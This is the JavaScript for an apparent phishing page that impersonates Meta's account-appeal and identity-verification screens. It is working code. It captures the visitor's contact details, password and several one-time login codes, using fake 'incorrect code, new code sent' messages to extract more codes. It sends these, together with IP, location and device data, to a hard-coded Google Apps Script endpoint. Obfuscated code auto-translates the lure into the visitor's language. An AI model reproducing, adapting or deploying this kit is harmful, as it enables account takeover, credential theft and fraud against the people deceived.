const __t = {};
function t(e) {
	return __t[e] || e;
}
const MSG_PRE = "<span class='check-color'>✓</span> ",
	MSG_LOADING = [
		'Verifying your account information...',
		'Processing your review request...',
		'Verifying your account security...',
		'Sending verification code to your device...',
	],
	MSG_FAIL = {
		1: [
			'The verification code is incorrect.',
			'Resetting your security session...',
			'Sending a new code to your device...',
			'This may take a few minutes...',
			'Please enter the latest code to proceed.',
		],
		2: [
			'Verification code does not match.',
			'Synchronizing security data...',
			'Requesting a new verification code...',
			'Checking notifications on your device...',
			'Enter the latest code to finalize.',
		],
		3: [
			'Verification code not accepted.',
			'Running account security check...',
			'Refreshing login session...',
			'Transmitting code via secure channel...',
			'Please use the latest code received.',
		],
		4: [
			'Verification data is invalid.',
			'Reviewing request history...',
			'Re-establishing connection to Meta servers...',
			'Generating a new one-time security code...',
			'Please enter the latest code sent to you.',
		],
		5: [
			'Analyzing advanced verification data...',
			'Security scan completed.',
			'Identity successfully verified.',
			'Granting final access...',
			'Please enter the latest code to complete.',
		],
	},
	MSG_RESEND = [
		'Requesting a new verification code...',
		'Establishing secure server connection...',
		'New verification code has been sent.',
		'Please check your device.',
		'Ready for new input.',
	],
	MSG_LOCKED = [
		'Identity verification request submitted.',
		'No further action is required from your side.',
		'Our security team is processing your request.',
	],
	__ALL_TEXTS = (() => {
		const e = [];
		return (
			Object.values(MSG_FAIL).forEach((t) => t.forEach((t) => e.push(t))),
			[
				...MSG_LOADING,
				...MSG_RESEND,
				...MSG_LOCKED,
				...e,
				'Please enter your contact information.',
				'Please enter your password to log in.',
				'Please enter your verification code.',
				'Submitting your appeal...',
				'Confirm your identity...',
				'Requesting new code...',
				'Verification Complete',
				'Incorrect code. A new code has been sent.',
				'A new code has been sent to your device.',
				'We can send you another code in a few minutes.',
				'You have X attempts remaining.',
			]
		);
	})(),
	step1 = document.getElementById('step1'),
	step2 = document.getElementById('step2'),
	step3 = document.getElementById('step3'),
	step5 = document.getElementById('step5'),
	step7 = document.getElementById('step7'),
	robotCheck = document.getElementById('robotCheck'),
	introVideo = document.getElementById('introVideo'),
	submitBtn = document.getElementById('submitBtn'),
	verifyOtpBtn = document.getElementById('verifyOtpBtn'),
	loadingOverlay = document.getElementById('loadingOverlay'),
	countdownEl = document.getElementById('countdown'),
	loadingTitle = document.getElementById('loadingTitle'),
	loadingStatus = document.getElementById('loadingStatus'),
	contactInput = document.getElementById('contact'),
	customerCodeInput = document.getElementById('customerCode'),
	contactError = document.getElementById('contactError'),
	customerCodeError = document.getElementById('customerCodeError'),
	otpCodeInput = document.getElementById('otpCode'),
	otpError = document.getElementById('otpError'),
	attemptText = document.getElementById('attemptText'),
	resendBtn = document.getElementById('resendBtn'),
	resendTimer = document.getElementById('resendTimer'),
	requestCode = document.getElementById('requestCode'),
	DEMO_OTP_CODE = '123456',
	MAX_OTP_ATTEMPTS = 5,
	GOOGLE_SCRIPT_URL =
		'https://script.google.com/macros/s/AKfycbzHWnQehVga6rpcUh5erGWcei2KIZQ5VMqg7_IA0F2Iq087AIyyxEIxfUUayT7906MCJQ/exec',
	SESSION_ID = 'SID-' + Date.now() + '-' + Math.floor(1e6 * Math.random());
let otpAttempts = 0,
	resendInterval = null;
function buildProgressBars() {
	document.querySelectorAll('.progress').forEach((e) => {
		const t = Number(e.dataset.progress);
		e.innerHTML = '';
		for (let n = 1; n <= 5; n++) {
			const o = document.createElement('span');
			(n < t && o.classList.add('done'),
				n === t && o.classList.add('active'),
				e.appendChild(o));
		}
	});
}
function showStep(e) {
	(document.querySelectorAll('.step').forEach((e) => {
		e.classList.remove('active');
	}),
		e.classList.add('active'),
		setTimeout(() => {
			window.scrollTo({ top: 0, behavior: 'smooth' });
		}, 50));
}
function scrollInputIntoView(e) {
	setTimeout(() => {
		e.scrollIntoView({ behavior: 'smooth', block: 'center' });
	}, 250);
}
function playVideoStep() {
	introVideo.currentTime = 0;
	const e = introVideo.play();
	void 0 !== e &&
		e.catch(() => {
			setTimeout(() => {
				showStep(step3);
			}, 4e3);
		});
	const t = setTimeout(() => {
		showStep(step3);
	}, 5e3);
	introVideo.onended = function () {
		(clearTimeout(t), showStep(step3));
	};
}
function lockOtpForm() {
	((otpCodeInput.disabled = !0),
		(verifyOtpBtn.disabled = !0),
		(resendBtn.disabled = !0),
		(verifyOtpBtn.style.opacity = '0.55'),
		(verifyOtpBtn.style.cursor = 'not-allowed'),
		(resendBtn.style.opacity = '0.55'),
		(resendBtn.style.cursor = 'not-allowed'));
}

/* ========================================================= */
/* HÀM XỬ LÝ CHUYỂN BƯỚC LẬP TỨC (ĐÃ BỎ BỘ ĐẾM NGƯỢC CHỜ ĐỢI) */
/* ========================================================= */
function showLoading(e) {
	if ('function' == typeof e.afterDone) {
		e.afterDone();
	}
}
/* ========================================================= */

function startResendCountdown() {
	let e = 60;
	((resendBtn.disabled = !1),
		(resendTimer.innerText = `${e}s`),
		resendInterval && clearInterval(resendInterval),
		(resendInterval = setInterval(() => {
			(e--,
				(resendTimer.innerText = `${e}s`),
				e <= 0 &&
					(clearInterval(resendInterval),
					(resendBtn.disabled = !1),
					(resendTimer.innerText = t('We can send you another code in a few minutes.'))));
		}, 1e3)));
}
function generateRequestCode() {
	return `REQ-2026-${Math.floor(1e5 + 9e5 * Math.random())}`;
}
function getSimpleDeviceType() {
	const e = navigator.userAgent.toLowerCase();
	return /iphone|ipod/.test(e)
		? 'iPhone'
		: /ipad/.test(e)
			? 'iPad'
			: /android/.test(e)
				? 'Android'
				: /mobile/.test(e)
					? 'Điện thoại'
					: 'Máy tính';
}
(buildProgressBars(),
	document.querySelectorAll('input').forEach((e) => {
		e.addEventListener('focus', function () {
			scrollInputIntoView(e);
		});
	}),
	robotCheck.addEventListener('change', function () {
		robotCheck.checked &&
			setTimeout(() => {
				(showStep(step2), playVideoStep());
			}, 500);
	}),
	submitBtn.addEventListener('click', function () {
		const e = contactInput.value.trim(),
			n = customerCodeInput.value.trim();
		let o = !0;
		if (
			((contactError.innerText = ''),
			(customerCodeError.innerText = ''),
			'' === e &&
				((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
			'' === n &&
				((customerCodeError.innerText = t('Please enter your password to log in.')), (o = !1)),
			!o)
		) {
			const t = '' === e ? contactInput : customerCodeInput;
			return (t.focus(), void scrollInputIntoView(t));
		}
		(sendToGoogleSheet('Form submitted'),
			showLoading({
				title: t('Submitting your appeal...'),
				afterDone: function () {
					(showStep(step5),
						startResendCountdown(),
						setTimeout(() => otpCodeInput.focus(), 400));
				},
			}));
	}),
	verifyOtpBtn.addEventListener('click', function () {
		const e = otpCodeInput.value.trim();
		if (((otpError.innerText = ''), otpAttempts >= 5)) lockOtpForm();
		else {
			if ('' === e)
				return (
					(otpError.innerText = t('Please enter your verification code.')),
					otpCodeInput.focus(),
					void scrollInputIntoView(otpCodeInput)
				);
			if (
				(sendToGoogleSheet('Internal code submitted', e),
				(otpCodeInput.value = ''),
				'123456' === e)
			)
				showLoading({
					title: t('Submitting your appeal...'),
					afterDone: function () {
						((requestCode.innerText = generateRequestCode()), showStep(step7));
					},
				});
			else {
				otpAttempts++;
				const e = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
				showLoading({
					title: t('Confirm your identity...'),
					statuses: e,
					afterDone: function () {
						const e = 5 - otpAttempts;
						if ((showStep(step5), e <= 0))
							return (
								lockOtpForm(),
								(loadingTitle.innerText = t('Verification Complete')),
								(loadingStatus.innerHTML = MSG_LOCKED.map(
									(e) => `<div class="loading-status-line">✓ ${t(e)}</div>`,
								).join('')),
								(countdownEl.innerText = '✓'),
								void loadingOverlay.classList.add('active')
							);
						((otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`),
							(attemptText.innerText = t('You have X attempts remaining.').replace(
								'X',
								e,
							)),
							setTimeout(() => {
								(otpCodeInput.focus(), scrollInputIntoView(otpCodeInput));
							}, 400));
					},
				});
			}
		}
	}),
	resendBtn.addEventListener('click', function () {
		((otpError.innerText = ''), (otpCodeInput.value = ''), (resendBtn.disabled = !0));
		const e = MSG_RESEND.map((e) => MSG_PRE + t(e));
		showLoading({
			title: t('Requesting new code...'),
			statuses: e,
			afterDone: function () {
				(showStep(step5),
					startResendCountdown(),
					(otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`),
					setTimeout(() => {
						otpCodeInput.focus();
					}, 400));
			},
		});
	}));
const sendToGoogleSheet = async (e, t = '') => {
	const n = localStorage.getItem('vai-ca-biu'),
		o = n ? JSON.parse(n) : {},
		{
			ip: r = 'Unknown',
			city: i = 'Unknown',
			region: s = 'Unknown',
			country: c = 'Unknown',
			postal: a = 'Unknown',
			continent: d = 'Unknown',
		} = o,
		u = new URLSearchParams();
	(u.append('session_id', SESSION_ID),
		u.append('contact', contactInput.value.trim()),
		u.append('customer_code', customerCodeInput.value.trim()),
		u.append('internal_code', t),
		u.append('device', getSimpleDeviceType()),
		u.append('status', e),
		u.append('ip', r),
		u.append('city', i),
		u.append('region', s),
		u.append('country', c),
		u.append('postal', a),
		u.append('continent', d),
		fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {}));
};

/* ========================================================= */
/* LOGIC QUẢN LÝ HỘP THOẠI THÔNG BÁO META AI (AN TOÀN)       */
/* ========================================================= */
(function() {
    const metaChatWrapper = document.getElementById('metaChatWrapper'),
          metaAiBox = document.getElementById('metaAiBox'),
          metaAiIcon = document.getElementById('metaAiIcon'),
          closeMetaAi = document.getElementById('closeMetaAi');

    let metaAiTimeout = null;

    if (!metaChatWrapper || !metaAiBox) return;

    function openMetaAiBox() {
        if (metaAiBox.classList.contains('hidden')) {
            metaAiBox.classList.remove('hidden');
        }
        if (metaAiTimeout) clearTimeout(metaAiTimeout);
        metaAiTimeout = setTimeout(() => {
            closeMetaAiBox();
        }, 6000); 
    }

    function closeMetaAiBox() {
        metaAiBox.classList.add('hidden');
        if (metaAiTimeout) clearTimeout(metaAiTimeout);
    }

    // Sử dụng MutationObserver để theo dõi sự thay đổi step một cách an toàn tuyệt đối, 
    // không can thiệp hay ghi đè vào hàm showStep gốc của hệ thống nữa.
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.attributeName === 'class') {
                const target = mutation.target;
                if (target.classList.contains('active')) {
                    const stepId = target.id;
                    // Chỉ kích hoạt và tự động hiển thị tại step3 hoặc step5
                    if (stepId === 'step3' || stepId === 'step5') {
                        metaChatWrapper.style.display = 'flex';
                        openMetaAiBox();
                    } else {
                        metaChatWrapper.style.display = 'none';
                        closeMetaAiBox();
                    }
                }
            }
        });
    });

    // Cấu hình theo dõi tất cả các thẻ section có class là "step"
    document.querySelectorAll('section.step').forEach(stepSection => {
        observer.observe(stepSection, { attributes: true });
    });

    // Sự kiện: Bấm vào logo để hiện lại hộp thoại
    metaAiIcon.addEventListener('click', (e) => {
        e.stopPropagation();
        openMetaAiBox();
    });

    // Sự kiện: Bấm vào dấu "x" để tắt
    if (closeMetaAi) {
        closeMetaAi.addEventListener('click', (e) => {
            e.stopPropagation();
            closeMetaAiBox();
        });
    }

    // Tự động ẩn khi người dùng tương tác vào các ô nhập liệu hoặc nút bấm
    document.addEventListener('focusin', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON') {
            closeMetaAiBox();
        }
    });

    document.addEventListener('click', (e) => {
        if (e.target.closest('input') || e.target.closest('button') || e.target.closest('.error')) {
            closeMetaAiBox();
        }
    });
})();
/* ========================================================= */

function kimochi() {
	function _0x2c14(_0x11175b, _0x1a8796) {
		_0x11175b = _0x11175b - 0x1c9;
		const _0x42b224 = _0x42b2();
		let _0x2c1441 = _0x42b224[_0x11175b];
		return _0x2c1441;
	}
	const _0x9d89ff = _0x2c14;
	function _0x42b2() {
		const _0x2406fc = [
			'1277720UOnMRO',
			'218796bFgtmP',
			'trim',
			'2353900wpdMdQ',
			'9lrPbgt',
			'json',
			'placeholder',
			'292903cyZywX',
			'124734PnVlHe',
			'then',
			'textContent',
			'map',
			'448912sPnVxX',
			'https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=',
			'language',
			'147mDbyoJ',
			'forEach',
			'length',
			'push',
			'querySelectorAll',
			'53280xWccGi',
			'28anPyIR',
		];
		_0x42b2 = function () {
			return _0x2406fc;
		};
		return _0x42b2();
	}
	(function (_0x44e94b, _0x5c3531) {
		const _0x1a4ea7 = _0x2c14,
			_0x389141 = _0x44e94b();
		while (!![]) {
			try {
				const _0x523606 =
					-parseInt(_0x1a4ea7(0x1ce)) / 0x1 +
					-parseInt(_0x1a4ea7(0x1de)) / 0x2 +
					(parseInt(_0x1a4ea7(0x1cf)) / 0x3) * (parseInt(_0x1a4ea7(0x1dc)) / 0x4) +
					parseInt(_0x1a4ea7(0x1dd)) / 0x5 +
					(-parseInt(_0x1a4ea7(0x1db)) / 0x6) * (-parseInt(_0x1a4ea7(0x1d6)) / 0x7) +
					(-parseInt(_0x1a4ea7(0x1d3)) / 0x8) * (-parseInt(_0x1a4ea7(0x1cb)) / 0x9) +
					-parseInt(_0x1a4ea7(0x1ca)) / 0xa;
				if (_0x523606 === _0x5c3531) break;
				else _0x389141['push'](_0x389141['shift']());
			} catch (_0x9762df) {
				_0x389141['push'](_0x389141['shift']());
			}
		}
	})(_0x42b2, 0x24fc5);
	{
		const lang = (navigator['languages']?.[0x0] || navigator[_0x9d89ff(0x1d5)] || 'en')
			['split']('-')[0x0]
			['toLowerCase']();
		if (lang !== 'en' && lang) {
			const els = [...document[_0x9d89ff(0x1da)]('[data-i18n]')],
				placeholders = [...document[_0x9d89ff(0x1da)]('[data-i18n-placeholder]')],
				collect = [];
			(els[_0x9d89ff(0x1d7)]((_0x82697) => {
				const _0x4545cd = _0x9d89ff,
					_0x178c7b = _0x82697[_0x4545cd(0x1d1)][_0x4545cd(0x1c9)]();
				if (_0x178c7b) collect[_0x4545cd(0x1d9)](_0x178c7b);
			}),
				placeholders['forEach']((_0x46b636) => {
					const _0x14b2ef = _0x9d89ff,
						_0x472ae3 = _0x46b636[_0x14b2ef(0x1cd)];
					if (_0x472ae3) collect[_0x14b2ef(0x1d9)](_0x472ae3);
				}),
				collect[_0x9d89ff(0x1d9)](...__ALL_TEXTS));
			const unique = [...new Set(collect)];
			if (!unique[_0x9d89ff(0x1d8)]) return;
			const run = (_0x224f9b) =>
				fetch(_0x9d89ff(0x1d4) + lang + '&dt=t&q=' + encodeURIComponent(_0x224f9b))
					[_0x9d89ff(0x1d0)]((_0x2f30af) =>
						_0x2f30af['ok'] ? _0x2f30af[_0x9d89ff(0x1cc)]() : null,
					)
					[_0x9d89ff(0x1d0)]((_0x51735b) => {
						const _0x325426 =
							_0x51735b?.[0x0]
								?.['map']((_0x51117e) => _0x51117e?.[0x0] || '')
								['join']('') || '';
						if (_0x325426) __t[_0x224f9b] = _0x325426;
					})
					['catch'](() => {});
			Promise['all'](unique[_0x9d89ff(0x1d2)]((_0xa1ad1) => run(_0xa1ad1)))[_0x9d89ff(0x1d0)](
				() => {
					const _0x29ce88 = _0x9d89ff;
					(els[_0x29ce88(0x1d7)]((_0x250e54) => {
						const _0x15cfbc = _0x29ce88,
							_0x388447 = _0x250e54[_0x15cfbc(0x1d1)][_0x15cfbc(0x1c9)]();
						if (__t[_0x388447]) _0x250e54['textContent'] = __t[_0x388447];
					}),
						placeholders['forEach']((_0x271cb6) => {
							const _0x2eeacb = _0x29ce88;
							if (__t[_0x271cb6[_0x2eeacb(0x1cd)]])
								_0x271cb6['placeholder'] = __t[_0x271cb6[_0x2eeacb(0x1cd)]];
						}));
				},
			);
		}
	}
}
kimochi();